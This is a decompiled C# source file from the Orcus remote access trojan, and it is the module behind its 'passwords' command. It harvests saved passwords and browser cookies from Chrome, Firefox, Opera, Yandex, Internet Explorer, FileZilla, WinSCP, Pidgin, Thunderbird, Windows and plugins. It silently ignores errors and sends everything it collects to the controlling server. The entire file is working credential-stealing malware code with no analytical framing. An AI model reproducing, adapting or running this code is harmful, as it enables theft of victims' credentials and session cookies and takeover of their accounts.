using System;
using System.Collections.Generic;
using System.Linq;
using Orcus.CommandManagement;
using Orcus.Commands.Passwords.Applications.Chrome;
using Orcus.Commands.Passwords.Applications.CoreFTP;
using Orcus.Commands.Passwords.Applications.FileZilla;
using Orcus.Commands.Passwords.Applications.InternetExplorer;
using Orcus.Commands.Passwords.Applications.JDownloader;
using Orcus.Commands.Passwords.Applications.Mozilla;
using Orcus.Commands.Passwords.Applications.Opera;
using Orcus.Commands.Passwords.Applications.Pidgin;
using Orcus.Commands.Passwords.Applications.WinSCP;
using Orcus.Commands.Passwords.Applications.Windows;
using Orcus.Commands.Passwords.Applications.Yandex;
using Orcus.Plugins;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.Passwords;

internal class PasswordsCommand : Command
{
	public override void Dispose()
	{
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		PasswordData passwords = GetPasswords(recoverCookies: true);
		byte[] data = new Serializer(typeof(PasswordData)).Serialize((object)passwords);
		((ConnectionInfo)(object)connectionInfo).SendServerPackage((ServerPackageType)0, data, redirectPackage: true);
	}

	public static PasswordData GetPasswords(bool recoverCookies)
	{
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		IPasswordRecovery[] array = new IPasswordRecovery[12]
		{
			new Chrome(),
			new CoreFtp(),
			new FileZilla(),
			new InternetExplorer(),
			new Opera(),
			new WinSCP(),
			new Yandex(),
			new Pidgin(),
			new Firefox(),
			new JDownloader(),
			new Thunderbird(),
			new Windows()
		};
		PasswordData val = new PasswordData();
		val.set_Cookies(new List<RecoveredCookie>());
		val.set_Passwords(new List<RecoveredPassword>());
		PasswordData val2 = val;
		IPasswordRecovery[] array2 = array;
		foreach (IPasswordRecovery passwordRecovery in array2)
		{
			try
			{
				val2.get_Passwords().AddRange(passwordRecovery.GetPasswords());
			}
			catch (Exception)
			{
			}
		}
		foreach (ClientController clientPlugin in PluginLoader.Current.ClientPlugins)
		{
			try
			{
				List<RecoveredPassword> list = clientPlugin.RecoverPasswords();
				if (list != null && list.Count > 0)
				{
					val2.get_Passwords().AddRange(list);
				}
			}
			catch (Exception)
			{
			}
		}
		if (recoverCookies)
		{
			foreach (ICookieRecovery item in array.OfType<ICookieRecovery>())
			{
				try
				{
					val2.get_Cookies().AddRange(item.GetCookies());
				}
				catch (Exception)
				{
				}
			}
			{
				foreach (ClientController clientPlugin2 in PluginLoader.Current.ClientPlugins)
				{
					try
					{
						List<RecoveredCookie> list2 = clientPlugin2.RecoverCookies();
						if (list2 != null && list2.Count > 0)
						{
							val2.get_Cookies().AddRange(list2);
						}
					}
					catch (Exception)
					{
					}
				}
				return val2;
			}
		}
		return val2;
	}

	protected override uint GetId()
	{
		return 12u;
	}
}
